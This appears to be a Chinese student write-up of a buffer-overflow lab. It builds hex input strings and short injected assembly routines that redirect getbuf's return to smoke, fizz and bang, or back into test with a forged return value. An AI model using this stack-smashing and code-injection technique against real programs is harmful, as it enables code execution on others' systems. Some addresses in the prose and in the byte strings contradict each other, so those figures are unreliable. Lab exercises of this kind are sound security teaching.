Level 0

本实验室需要我们在getbuf()函数执行返回之后不返回正常的地址，而是转去执行smoke函数。查看汇编代码得到smoke函数的入口地址为0x08048c18,调用getbuf函数时输入字符串存放位置为$epb-0x28.返回地址为$ebp+4.则得到要输入的字节码应该是44个00.

[![gpJFcd.png](https://z3.ax1x.com/2021/04/26/gpJFcd.png)](https://imgtu.com/i/gpJFcd)

所以我们构造的序列应该是

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 18 8c 04 08
```

Level 1

这段程序是执行getbuf()函数后不返回到正常的返回地址，而是去执行fizz函数，而且要将cookie值作为参数传给fizz函数。

[![giC0B9.md.png](https://z3.ax1x.com/2021/04/28/giC0B9.md.png)](https://imgtu.com/i/giC0B9)

分析fizz函数，如图可以看到入口地址为0x8048c42，参数的存放位置应该是$ebp+0x8，所以我们要修改返回地址使其指向fizz函数，再继续修改栈中的值，将cookie传给fizz函数。生成的cookie值为0x53f78a46。

构造序列为： 

```
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 6f 90 04 08 00 00
 00 00 46 8a f7 53 
```

Level 2

该程序是让getbuf()函数返回后执行bang()函数，但是在执行bang函数之前需要将全局变量global_value变为我们自己userid的cookie。

[![giRNGT.md.png](https://z3.ax1x.com/2021/04/28/giRNGT.md.png)](https://imgtu.com/i/giRNGT)

从图中可以知道bang函数入口地址为0x8048c9d，根据cmp指令可以知道cookie存储的位置为0x804d108,global_value的地址0x80d100。

```
    mov 0x804d108,%eax
    mov %eax,0x804d100
    push $0x8048c9d
    ret
```

上面代码执行的是修改global_value的值，并将bang函数的起始地址压入栈并返回，用于执行后跳转到bang函数。用gcc和objdump指令可以生成本机器的二进制代码。因为已经实现了修改值和跳转的功能，我们需要将该代码防止在buf中，并让系统跳转到该段代码的起始处执行。根据level0可以知道buf距离ebp有0x28个字节，通过gdb调试获取执行到getbuf时寄存器内，可以计算出buf起始地址为0x55683458，所以我们构造的序列为

```
a1 08 d1 04 08 a3 00 d1
04 08 68 9d 8c 04 08 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 58 34 68 55
```

Level 3

该实验与level2相似，需要修改getbuf()返回值为对应cookie，恢复test函数中的%ebp寄存器内容，然后返回到接下去test()函数执行位置正常执行。通过gdb调试，结合过程调用中old ebp和正常返回地址距离当前%ebp分别为0和4字节。所以获得了old ebp内容为0x556834b0，正常下一条指令地址为0x80484be.

根据设置getbuf()返回值，重建ebp,返回test()函数的汇编代码获取二进制代码

```
a1 08 d1 04 08   		mov 0x804d108,%eax
bd b0 34 68 55  		mov $0x556834b0,%ebp
68 be 8d 04 08   		push $0x8048dbe
c3					   ret
```

第一行命令为设置返回值为cookie

第二行命令为重建ebp指针，使得程序返回test()时能正常执行

第三行命令为设置返回为test()中正常执行的下一行地址

第四行将栈中返回地址弹出，并且将eip指向该地址。

构造序列为

```
a1 08 d1 04 08 bd b0 34 
68 55 68 be 8d 04 08 c3 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00  
00 00 00 00 58 34 68 55
```

